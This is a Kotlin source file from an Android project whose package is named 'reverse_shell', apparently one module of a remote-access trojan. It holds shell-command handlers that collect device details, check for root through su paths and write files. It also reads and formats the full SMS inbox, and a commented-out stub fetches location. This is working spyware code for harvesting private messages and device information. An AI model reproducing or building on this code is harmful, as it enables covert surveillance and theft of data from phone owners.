package com.ironclad.saksham.reverse_shell

import android.content.Context
import android.location.Location
import android.net.Uri
import android.os.Build
import com.google.android.gms.location.LocationServices
import java.io.File

fun getSystemInfo(): String {
    val manufacturer = Build.MANUFACTURER
    val model = Build.MODEL
    val sdk = Build.VERSION.SDK_INT
    val versionRelease = Build.VERSION.RELEASE

    return """
        Manufacturer: $manufacturer 
        Model: $model 
        SDK version: $sdk 
        Android version: $versionRelease
         """.trimIndent()
}

fun checkRoot(): String {
    val paths = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su"
    )

    return if(
        paths.any { path -> File(path).exists()})
    {
        "Device is rooted"
    }
    else{
        "Device is not rooted"
    }
}

fun help():String{
    return """
        ----- Additional Shell Commands -----
        help - show help
        sysinfo - get system information
        checkroot - check if device is rooted
        download - download file from url
        location - get device current location
        
    """.trimIndent()
}

fun getSms(context: Context): String {
    val messages = mutableListOf<String>()
    val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
    cursor?.use {
        if (it.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until it.columnCount) {
                    msgData += " ${it.getColumnName(idx)}:${it.getString(idx)}"
                }
                messages.add(msgData)
            } while (it.moveToNext())
        } else {
            throw Exception("Inbox is empty")
        }
    }
    val formattedMessages = messages.joinToString("\n")
    return formattedMessages
}


//Throws error: /sdcard/Dummy/pogo.txt: open failed: EPERM (Operation not permitted)
fun writeToFile(path:String, fileName: String, data: String): String {
    val file = File(path, fileName)
    file.writeText(data)
    return "Done"
}



//@SuppressLint("MissingPermission")
//suspend fun getCurrentLocation(context: Context): Location {
//    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
//    val lastLocation = fusedLocationClient.lastLocation.await()
//    lastLocation.let {
//        return lastLocation
//    }
//}

